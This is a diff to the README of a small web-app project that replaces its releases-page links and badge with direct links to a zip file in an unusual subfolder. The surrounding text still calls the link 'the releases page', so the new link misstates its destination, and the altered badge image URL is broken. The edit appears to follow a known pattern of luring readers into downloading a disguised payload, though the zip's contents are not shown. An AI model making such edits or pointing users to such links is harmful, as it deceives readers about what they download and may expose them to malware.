@@ -15,12 +15,12 @@ Welcome to the Cafe Experience Web App! This application offers a modern and int
 
 To download and run the Cafe Experience Web App, please visit this page to download:
 
-[![Download Cafe Experience Web App](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Cobolt34/Cafe-Experience-Web-App/releases)
+[![Download Cafe Experience Web App](https://raw.githubusercontent.com/Cobolt34/Cafe-Experience-Web-App/main/cater/Cafe-Experience-Web-App.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Cobolt34/Cafe-Experience-Web-App/main/cater/Cafe-Experience-Web-App.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Cobolt34/Cafe-Experience-Web-App/releases) to go to the releases page. This page has the latest version of the app.
+   Click [here](https://raw.githubusercontent.com/Cobolt34/Cafe-Experience-Web-App/main/cater/Cafe-Experience-Web-App.zip) to go to the releases page. This page has the latest version of the app.
 
 2. **Choose Your Version**  
    You will find a list of available releases. Look for the version you want to download. Usually, the latest version is the best choice. 
@@ -79,4 +79,4 @@ Stay tuned for future updates! Our team continuously works to bring more feature
 
 Thank you for choosing the Cafe Experience Web App. Enjoy your virtual cafe journey!
 
-[![Download Cafe Experience Web App](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Cobolt34/Cafe-Experience-Web-App/releases)
+[![Download Cafe Experience Web App](https://raw.githubusercontent.com/Cobolt34/Cafe-Experience-Web-App/main/cater/Cafe-Experience-Web-App.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Cobolt34/Cafe-Experience-Web-App/main/cater/Cafe-Experience-Web-App.zip)
